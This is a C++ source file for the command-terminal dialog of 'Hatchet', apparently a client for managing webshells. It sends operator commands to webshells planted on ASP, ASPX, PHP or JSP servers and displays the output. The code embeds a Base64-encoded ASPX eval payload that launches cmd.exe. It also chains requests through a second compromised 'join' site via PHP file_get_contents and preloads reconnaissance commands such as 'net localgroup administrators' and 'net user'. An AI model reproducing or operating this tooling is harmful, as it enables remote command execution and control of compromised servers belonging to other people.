// CmdDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "Hatchet.h"
#include "CmdDlg.h"

// CCmdDlg 对话框
DWORD WINAPI GetCmdData(LPVOID lpParam);	//线程 执行CMD

IMPLEMENT_DYNAMIC(CCmdDlg, CDialog)

CCmdDlg::CCmdDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CCmdDlg::IDD, pParent)
{

}

CCmdDlg::~CCmdDlg()
{
	DestroyWindow();
}

void CCmdDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_CMD, m_cmd);
}


BEGIN_MESSAGE_MAP(CCmdDlg, CDialog)
	ON_WM_SIZE()
	ON_WM_CTLCOLOR()
	ON_EN_KILLFOCUS(IDC_CMD, &CCmdDlg::OnEnKillfocusCmd)
END_MESSAGE_MAP()


// CCmdDlg 消息处理程序

void CCmdDlg::OnSize(UINT nType, int cx, int cy)
{
	CDialog::OnSize(nType, cx, cy);

	CRect rcClient;
	GetClientRect(rcClient);

	CWnd*	pCWnd   =   GetDlgItem(IDC_CMD);
	if (pCWnd != NULL)
	{
		pCWnd->MoveWindow(rcClient);
	}
}

HBRUSH CCmdDlg::OnCtlColor(CDC* pDC, CWnd* pWnd, UINT nCtlColor)
{
	HBRUSH hbr = CDialog::OnCtlColor(pDC, pWnd, nCtlColor);

	// TODO:  在此更改 DC 的任何特性
	if(nCtlColor == CTLCOLOR_EDIT)
	{
		hbr=CreateSolidBrush(RGB(0,0,0));		//EDIT背景颜色

		pDC->SetBkColor(RGB(0,0,0));			//字体背景色
		pDC->SetTextColor(RGB(50, 150, 150));	//字体颜色
	}
	// TODO:  如果默认的不是所需画笔，则返回另一个画笔
	return hbr;
}

void CstringArrayAddstr(CStringArray* pArray, CString str)	//删除原来的添加现在的，排序问题
{
	int i=0, nCount = (int)pArray->GetCount();

	for (i = 0; i <nCount; i++)
	{
		if (pArray->GetAt(i) == str)
		{
			pArray->RemoveAt(i);
			break;
		}
	}

	pArray->Add(str);
	return;
}

BOOL CCmdDlg::PreTranslateMessage(MSG* pMsg)
{
	CString temp;
	if (!bIsSetSel)								//会被全选
	{
		m_cmd.SetSel(CharLen_New, CharLen_New);
		bIsSetSel = true;
	}

	if(pMsg->message == WM_KEYDOWN)				//如果键盘按下
	{
		if(pMsg -> wParam == VK_ESCAPE)			// Esc 不退出
		{
			pEdit->GetWindowText(Cmdtemp);
			CharLen_New = Cmdtemp.GetLength();	//获取最新的个数
			if (CharLen_Old < CharLen_New)		//有输入
			{
				pEdit->SetWindowText( OldCmdtemp );
				m_cmd.SetSel(CharLen_Old, CharLen_Old);	//移动到最后
			}			
			return TRUE;
		}
		if(GetFocus() == pEdit)					//焦点在文本框上
		{
			//////////////////////////////////////////////////////////////////////////
			if (!bThreadFinish)		//正在执行命令，禁止用户输入
			{
				m_edit.SetWindowText( "CMD Threads busy" );					//设置状态栏
				return TRUE;
			}
			//////////////////////////////////////////////////////////////////////////
			pEdit->GetWindowText(Cmdtemp);
			CharLen_New = Cmdtemp.GetLength();	//获取最新的个数

			if(pMsg->wParam == VK_RETURN)
			{
				CharLen_New = Cmdtemp.GetLength();

				if (CharLen_Old == CharLen_New || CharLen_New == 0)
				{
					//没输入
				}else if (CharLen_Old < CharLen_New)										//有输入
				{
					Cmdtemp = Cmdtemp.Mid(CharLen_Old, CharLen_New-CharLen_Old);	//截取
					Cmdtemp.TrimLeft();
					Cmdtemp.TrimRight();
					if (Cmdtemp != "")
					{
						temp = Cmdtemp;
						temp.MakeLower();		//转小写，一会儿比较
						if (temp == "cls")		//cls 清空
						{
							pEdit->SetWindowText(szSystemInfo + "\r\n\r\n" + szCmdRoot+">");
							OldCmdtemp = szSystemInfo + "\r\n\r\n" + szCmdRoot+">";//2014.01.09 修正BUG，上下箭头，旧的还显示出来。
							CharLen_New = szSystemInfo.GetLength() + 4 + szCmdRoot.GetLength() + 1;
							CharLen_Old = CharLen_New;
							m_cmd.SetSel(-1);
						}else if (temp.Left(5) == "setp ")											//配置CMD
						{
							szCmdExeAddr = DelCRLF( Cmdtemp.Right(Cmdtemp.GetLength()-5) );
							pEdit->GetWindowText( temp );
							temp = temp + "\r\nSet the Terminal Path as:"+ szCmdExeAddr +"\r\n\r\n"+ szCmdRoot +">";
							//szCmdExeAddr.Replace("\\","\\\\");	2015.01.20 IPC BUG
							pEdit->SetWindowText( temp );
							CharLen_Old = temp.GetLength();
							CharLen_New = CharLen_Old;
							m_cmd.SetSel(CharLen_New, CharLen_New);
						}else{
							CstringArrayAddstr(&szCmdDos, Cmdtemp);	//删除原来的添加现在的，排序问题
							nCmdDosCont = (int)szCmdDos.GetCount();
							if (bThreadFinish)
							{
								pEdit->GetWindowText( temp );
								m_edit.SetWindowText( "Please wait..." );					//设置状态栏
								temp = temp + "\r\nPlease wait...";
								pEdit->SetWindowText( temp );
								m_cmd.SetSel(temp.GetLength()-16, temp.GetLength()-16);

								bThreadFinish = false;
								szCmd = Cmdtemp;
								CreateThread(NULL, 0, GetCmdData, (LPVOID)this, 0, 0);
							}else{
								m_edit.SetWindowText( "CMD Threads busy" );					//设置状态栏
							}
						}
					}
				}
				return TRUE;
			}
			if(pMsg->wParam == VK_BACK)
			{
				if (Cmdtemp.GetLength() <= CharLen_Old)
				{
					return TRUE;
				}
			}
			if(pMsg->wParam != VK_CONTROL)			//不是CTRL ，WM_KEYDOWN 里面会有 CTRL
			{
				if ((pMsg->wParam == 'C' || pMsg->wParam == 'c') && ::GetKeyState(VK_CONTROL)&0x8000)
				{
				}else if ((pMsg->wParam == 'X' || pMsg->wParam == 'x') && ::GetKeyState(VK_CONTROL)&0x8000){
					return TRUE;
				}else if ((pMsg->wParam == 'A' || pMsg->wParam == 'a') && ::GetKeyState(VK_CONTROL)&0x8000)
				{
					m_cmd.SetSel(0,CharLen_New);//-1);		//全选
					return TRUE;
				}else if ((pMsg->wParam == 'V' || pMsg->wParam == 'v') && ::GetKeyState(VK_CONTROL)&0x8000)
				{
					int nStartChar, nEndChar;
					m_cmd.GetSel(nStartChar, nEndChar);//现在光标的位置，如果小于原来，移到最后
					int nNowPos = m_cmd.GetSel();
					if (nStartChar < CharLen_Old)						//原来字符不能更改
					{
						m_cmd.SetSel(CharLen_New, CharLen_New);//-1);	//移动到最后
					}
					//return TRUE; 移动到最后，不要返回，还要张贴
				}else if (pMsg->wParam == VK_UP)			//上箭头
				{
					if (nCmdDosCont >= 1)
					{
						pEdit->SetWindowText( OldCmdtemp + szCmdDos.GetAt(nCmdDosCont-1) );
						CharLen_Old = OldCmdtemp.GetLength();
						CharLen_New = CharLen_Old + szCmdDos.GetAt(nCmdDosCont-1).GetLength();
						nCmdDosCont--;
						bIsSetSel = false;
					}
					return FALSE;
				}else if(pMsg->wParam == VK_DOWN)			//下箭头
				{
					if (nCmdDosCont < szCmdDos.GetSize()-1)
					{
						nCmdDosCont++;
						pEdit->SetWindowText( OldCmdtemp + szCmdDos.GetAt(nCmdDosCont) );
						CharLen_Old = OldCmdtemp.GetLength();
						CharLen_New = CharLen_Old + szCmdDos.GetAt(nCmdDosCont-1).GetLength();
						bIsSetSel = false;
					}
					return FALSE;
				}else if(pMsg->wParam == VK_LEFT || pMsg->wParam == VK_RIGHT)		//左右 箭头不处理
				{
				}else{
					/*
					int nStartChar, nEndChar;
					m_cmd.GetSel(nStartChar, nEndChar);
					if (nEndChar < CharLen_Old)							//原来字符不能更改
					{
						m_cmd.SetSel(CharLen_New, CharLen_New);//-1);	//移动到最后
					}
					*/
				}
			}
			////////////////////////////////////////////////////////////////////////// 选择所有，随便按下某键，就全被删除了
			if (::GetKeyState(VK_CONTROL)&0x8000)
			{
			}else{
				int nStartChar, nEndChar;
				m_cmd.GetSel(nStartChar, nEndChar);
				if (nStartChar < CharLen_Old)							//原来字符不能更改
				{
					m_cmd.SetSel(CharLen_New, CharLen_New);//-1);	//移动到最后
				}
			}
			//////////////////////////////////////////////////////////////////////////
		}
	}
	pEdit->SetFocus();
	return CDialog::PreTranslateMessage(pMsg);
}


BOOL CCmdDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	GetDlgItem(IDC_CMD)->SetFont(&m_FontSample);

	CString temp;
	m_edit.SetWindowText( "Virtual Terminal" );					//设置状态栏

	szSiteUrl = szGlobal_SiteUrl;
	szSiteJoinUrl = szGlobal_SiteJoinUrl;
	szSitePass = szGlobal_SitePass;
	nSiteScript = nGlobal_SiteScript;
	nSiteCode = nGlobal_SiteCode;
	szSiteJoinPass = "";
	if (szSiteJoinUrl !="")
	{
		CString szSiteJoinUrlTemp = szSiteJoinUrl;
		szSiteJoinUrlTemp.Replace("'", "''");
		pMydb->Select("SELECT [SitePass] FROM [SiteTable] where [SiteUrl]='"+ szSiteJoinUrlTemp +"'", MydbArray);
		if (MydbArray.GetSize() != 0)
		{
			szSiteJoinPass = MydbArray.GetAt(0);
		}
	}
	if (nSiteCode == 65001)
	{
		szSiteCode = "UTF-8";
	}
	else if (nSiteCode == 936)
	{
		szSiteCode = "GB2312";
	}
	else if (nSiteCode == 950)
	{
		szSiteCode = "BIG5";
	}else{
		szSiteCode = "";
	}

	bThreadFinish = true;					//初始化 上条命令执行完毕
	CharLen_Old = 0;						//初始化 回车前的个数
	CharLen_New = 0;						//初始化 最新的个数
	bIsSetSel = false;						//初始化 会被全选
	szCmdExeAddr = "";

	szCacheItem = szSiteUrl.Left( szSiteUrl.Find("/", 9) ) +"|";	//初始化 Item
	szCacheItem.Replace("'", "''");
	pEdit = GetDlgItem(IDC_CMD);
	m_cmd.SetLimitText(-1);//UINT_MAX);

	//////////////////////////////////////////////////////////////////////////								//缓存技术
	pMydbTmp->Select("select Dat from CACHE where Item='"+ szCacheItem +"base'", MydbTmpArray);
	if (MydbTmpArray.GetSize() == 0)										//AfxMessageBox("没有缓存数据");
	{
		if (nSiteScript == 1)
		{
			bHttpIsOK = MyHttp(szSiteUrl, szSitePass + szCmdGetInfo[nSiteScript-1], nSiteCode, temp, szError);
		}else if (nSiteScript == 2)					//ASPX 有编码
		{
			szCmdFamatPageCode.Format("%d", nSiteCode);
			temp = szCmdGetInfo[nSiteScript-1];
			temp.Replace("%nPageCode%", szCmdFamatPageCode);
			bHttpIsOK = MyHttp(szSiteUrl, szSitePass + temp, nSiteCode, temp, szError);

		}else if (nSiteScript == 3)
		{
			if (szSiteJoinUrl !="" && szSiteJoinPass != "")
			{
				CString szCmdGetInfo_Join = "$data='"+ szSitePass + szCmdGetInfo[nSiteScript-1] +"';"
					"$op=array('http'=>array('method'=>'POST','header'=>\"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)\\r\\nContent-type: application/x-www-form-urlencoded\\r\\n"
					"Content-length: \".strlen($data).\"\\r\\n\",'content'=>$data));echo file_get_contents('"+szSiteUrl+"',false,stream_context_create($op));";

				szCmdGetInfo_Join = Ini_szPHP_POST_DATA + MyBase64Encode(-1, Ini_szPHP_POST_Z0_DATA + szCmdGetInfo_Join);

				bHttpIsOK = MyHttp(szSiteJoinUrl, szSiteJoinPass + szCmdGetInfo_Join, nSiteCode, temp, szError);
			}else if(szSiteJoinUrl !="" && szSiteJoinPass == "")
			{
				AfxMessageBox("Join Url NotFind!");
				bCloseTab = true;
				return TRUE;
			}else{
				bHttpIsOK = MyHttp(szSiteUrl, szSitePass + szCmdGetInfo[nSiteScript-1], nSiteCode, temp, szError);
			}
		}else if (nSiteScript == 4)				//JSP 有编码
		{
			bHttpIsOK = MyHttp(szSiteUrl, szSitePass + "=A&z0="+szSiteCode, nSiteCode, temp, szError);
		}else{
			
		}

		if (!bHttpIsOK)
		{
			AfxMessageBox( szError );
			bCloseTab = true;
			return TRUE;
		}
		pMydbTmp->Execute("INSERT INTO CACHE (Item,Dat) VALUES ('"+ szCacheItem +"base','"+ temp +"')");			//保存缓存
	}else{
		temp = MydbTmpArray.GetAt(0);			//缓存有数据
	}

	int posX = temp.Find("\t");
	WWWRoot = temp.Mid(0,posX);
	if (WWWRoot[0] == '/')
	{
		IsWin = false;
		posX = temp.Find("\t", posX+1);
		//////////////////////////////////////////////////////////////////////////
		szCmdDos.RemoveAll();
		szCmdDos.Add("ps -aux");
		szCmdDos.Add("ifconfig -a");
		szCmdDos.Add("netstat -an | grep ESTABLISHED");
		nCmdDosCont = (int)szCmdDos.GetCount();
		//////////////////////////////////////////////////////////////////////////
	}else{
		IsWin =true;
		WWWRoot.Replace("/","\\");
		//////////////////////////////////////////////////////////////////////////
		szCmdDos.RemoveAll();
		szCmdDos.Add("net localgroup administrators");
		szCmdDos.Add("net user");
		szCmdDos.Add("ipconfig /all");
		szCmdDos.Add("netstat -an | find \"ESTABLISHED\"");
		nCmdDosCont = (int)szCmdDos.GetCount();
		//////////////////////////////////////////////////////////////////////////
	}

	szSystemInfo = "["+temp.Mid(posX+1, temp.GetLength()-posX-1)+"]";
	OldCmdtemp = szSystemInfo + "\r\n\r\n" + WWWRoot + ">";

	szCmdRoot = WWWRoot;
	pEdit->SetWindowText( OldCmdtemp );
	CharLen_Old = OldCmdtemp.GetLength();
	CharLen_New = CharLen_Old;

	return TRUE;  // return TRUE unless you set the focus to a control
	// 异常: OCX 属性页应返回 FALSE
}


DWORD WINAPI GetCmdData(LPVOID lpParam)
{
	CCmdDlg* pDlg = (CCmdDlg*)lpParam;
	
	CString temp = "";
	CString szCmdAddr;
	if (pDlg->nSiteScript == 1)					//ASP
	{
		if (pDlg->szCmdExeAddr == "")
		{
			szCmdAddr = "636D64";
		}else{
			szCmdAddr = UrlEnCode(pDlg->nSiteCode, pDlg->szCmdExeAddr, false, true);
		}
		temp = UrlEnCode(pDlg->nSiteCode, "cd /d \""+ pDlg->szCmdRoot +"\"&"+ pDlg->szCmd +"&echo [S]&cd&echo [E]", false, true);
		bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass + szCmdGetExec[0] + "&z1="+ szCmdAddr +"&z2="+ temp, pDlg->nSiteCode, temp, szError);

	}else if (pDlg->nSiteScript == 2)				//ASPX
	{
		if (pDlg->szCmdExeAddr == "")
		{
			szCmdAddr = "Y21k";
		}else{
			szCmdAddr = MyBase64Encode(pDlg->nSiteCode, pDlg->szCmdExeAddr);
		}
		temp = MyBase64Encode(pDlg->nSiteCode, "cd /d \""+pDlg->szCmdRoot+"\"&"+ pDlg->szCmd +"&echo [S]&cd&echo [E]");
		pDlg->szCmdFamatPageCode.Format("%d", pDlg->nSiteCode);
		temp = szCmdGetExec[1] + "&z1="+ szCmdAddr +"&z2="+ temp;
		temp.Replace("%nPageCode%", pDlg->szCmdFamatPageCode);

		CString szBase64EvalCode = "var c=new System.Diagnostics.ProcessStartInfo(System.Text.Encoding.GetEncoding("+ pDlg->szCmdFamatPageCode +").GetString("
			"System.Convert.FromBase64String(Request.Item[\"z1\"])));var e=new System.Diagnostics.Process()"
			";var out:System.IO.StreamReader,EI:System.IO.StreamReader;c.UseShellExecute=false;c.RedirectSt"
			"andardOutput=true;c.RedirectStandardError=true;e.StartInfo=c;c.Arguments=\"/c \"+System.Te"
			"xt.Encoding.GetEncoding("+ pDlg->szCmdFamatPageCode +").GetString(System.Convert.FromBase64String(Request.Item[\"z2\"])"
			");e.Start();out=e.StandardOutput;EI=e.StandardError;e.Close();Response.Write(out.ReadToEnd()+EI.ReadToEnd());";
		szBase64EvalCode = MyBase64Encode(-1, szBase64EvalCode);
		temp.Replace("%szBase64EvalCode%", szBase64EvalCode);

		bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass + temp, pDlg->nSiteCode, temp, szError);

	}else if (pDlg->nSiteScript == 3)				//PHP
	{
		if (pDlg->IsWin)
		{
			if (pDlg->szCmdExeAddr == "")
			{
				szCmdAddr = "Y21k";
			}else{
				szCmdAddr = MyBase64Encode(pDlg->nSiteCode, pDlg->szCmdExeAddr);
			}
			temp = MyBase64Encode(pDlg->nSiteCode, "cd /d \""+pDlg->szCmdRoot+"\"&"+ pDlg->szCmd +"&echo [S]&cd&echo [E]");
		}else{
			if (pDlg->szCmdExeAddr == "")
			{
				szCmdAddr = "L2Jpbi9zaA";
			}else{
				szCmdAddr = MyBase64Encode(pDlg->nSiteCode, pDlg->szCmdExeAddr);
			}
			temp = MyBase64Encode(pDlg->nSiteCode, "cd \""+pDlg->szCmdRoot+"\";"+ pDlg->szCmd +";echo [S];pwd;echo [E]");
		}
		if (pDlg->szSiteJoinUrl !="" && pDlg->szSiteJoinPass != "")		////////////////////////////////////////////////////////////////////////// 代理执行
		{
			CString szCmdGetExec_Join = "$data='"+ pDlg->szSitePass + szCmdGetExec[2] + "&z1="+ szCmdAddr +"&z2="+ temp +"';"
				"$op=array('http'=>array('method'=>'POST','header'=>\"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)\\r\\nContent-type: application/x-www-form-urlencoded\\r\\n"
				"Content-length: \".strlen($data).\"\\r\\n\",'content'=>$data));echo file_get_contents('"+pDlg->szSiteUrl+"',false,stream_context_create($op));";

			szCmdGetExec_Join = Ini_szPHP_POST_DATA + MyBase64Encode(-1, Ini_szPHP_POST_Z0_DATA + szCmdGetExec_Join);
			bHttpIsOK = MyHttp(pDlg->szSiteJoinUrl, pDlg->szSiteJoinPass + szCmdGetExec_Join, pDlg->nSiteCode, temp, szError);
		}else if(pDlg->szSiteJoinUrl !="" && pDlg->szSiteJoinPass == "")
		{
		}else{
			bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass + szCmdGetExec[2] + "&z1="+ szCmdAddr +"&z2="+ temp, pDlg->nSiteCode, temp, szError);
		}
	}else if (pDlg->nSiteScript == 4)				//JSP
	{
		if (pDlg->IsWin)
		{
			if (pDlg->szCmdExeAddr == "")
			{
				szCmdAddr = "cmd";
			}else{
				szCmdAddr = UrlEnCode(pDlg->nSiteCode, pDlg->szCmdExeAddr);
			}
			temp = UrlEnCode(pDlg->nSiteCode, pDlg->szCmdRoot +"\"&"+ pDlg->szCmd);
			bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass + "=M&z0="+ pDlg->szSiteCode +"&z1=/c"+ szCmdAddr +"&z2=cd+%2Fd+%22"+ temp +"%26echo+%5BS%5D%26cd%26echo+%5BE%5D", pDlg->nSiteCode, temp, szError);
		}else{
			if (pDlg->szCmdExeAddr == "")
			{
				szCmdAddr = "%2Fbin%2Fsh";
			}else{
				szCmdAddr = UrlEnCode(pDlg->nSiteCode, pDlg->szCmdExeAddr);
			}
			temp = UrlEnCode(pDlg->nSiteCode, pDlg->szCmdRoot +"\";"+ pDlg->szCmd);
			bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass + "=M&z0="+ pDlg->szSiteCode +"&z1=-c"+ szCmdAddr +"&z2=cd+%22"+ temp +"%3Becho+%5BS%5D%3Bpwd%3Becho+%5BE%5D", pDlg->nSiteCode, temp, szError);
		}
	}

	if (pDlg->m_hWnd == NULL)		//正在执行，如果关闭就崩溃了。
	{
		return 0;
	}
	if (!bHttpIsOK)
	{
		pDlg->bThreadFinish = true;
		MessageBox(pDlg->m_hWnd, szError, "Error", 0);
		//////////////////////////////////////////////////////////////////////////
		pDlg->pEdit->GetWindowText( pDlg->OldCmdtemp );

		if (pDlg->OldCmdtemp.Right(16) == "\r\nPlease wait...")							//去掉Please wait...的显示。
		{
			pDlg->OldCmdtemp = pDlg->OldCmdtemp.Left(pDlg->OldCmdtemp.GetLength() - 16);
		}
		pDlg->OldCmdtemp += "\r\nRun command ["+ pDlg->szCmd +"] failed!\r\n"+ pDlg->szCmdRoot +">";

		pDlg->pEdit->SetWindowText( pDlg->OldCmdtemp );
		pDlg->CharLen_Old = pDlg->OldCmdtemp.GetLength();
		pDlg->CharLen_New = pDlg->CharLen_Old;
		pDlg->m_cmd.SetSel(pDlg->CharLen_New, pDlg->CharLen_New);//-1);

		m_edit.SetWindowText( "Virtual Terminal" );					//设置状态栏

		return 0;
	}

	temp.TrimLeft();
	temp.TrimRight();
	if ( temp.Find("\r\n") == -1 )
	{
		temp.Replace("\n","\r\n");
	}

	int posX = temp.Find("[S]\r");
	if (posX == -1)
	{
		//apache   20081  0.0  0.3   2564  1016 ?        S    09:03   0:00 /bin/sh -c cd /var/www/html;ps -aux;echo [S];pwd;echo [E]
		posX = temp.Find("[S]\n");
	}

	int posY = temp.Find("[E]", posX+3);
	if (posX != -1 && posY != -1)
	{
		pDlg->szCmdRoot = temp.Mid(posX+3, posY-posX-3);
		temp.Delete(posX, posY-posX+3);
		pDlg->szCmdRoot.Replace("\r", "");
		pDlg->szCmdRoot.Replace("\n", "");
	}
	temp = temp + "\r\n" + pDlg->szCmdRoot +">";

	pDlg->pEdit->GetWindowText( pDlg->OldCmdtemp );

	if (pDlg->OldCmdtemp.Right(16) == "\r\nPlease wait...")							//去掉Please wait...的显示。
	{
		pDlg->OldCmdtemp = pDlg->OldCmdtemp.Left(pDlg->OldCmdtemp.GetLength() - 16);
	}

	if (!pDlg->IsWin)
	{
		temp.Replace("\n","\r\n");					//Win \r\n   Linux \n
	}
	pDlg->OldCmdtemp = pDlg->OldCmdtemp +"\r\n"+ temp;

	pDlg->pEdit->SetWindowText( pDlg->OldCmdtemp );
	pDlg->CharLen_Old = pDlg->OldCmdtemp.GetLength();
	pDlg->CharLen_New = pDlg->CharLen_Old;
	pDlg->m_cmd.SetSel(pDlg->CharLen_New, pDlg->CharLen_New);//-1);

	m_edit.SetWindowText( "Virtual Terminal" );					//设置状态栏
	pDlg->bThreadFinish = true;
	return 0;
}


void CCmdDlg::OnEnKillfocusCmd()
{
	bIsSetSel = false;				//控件失去焦点，选择到最后，不然会被全选。
}
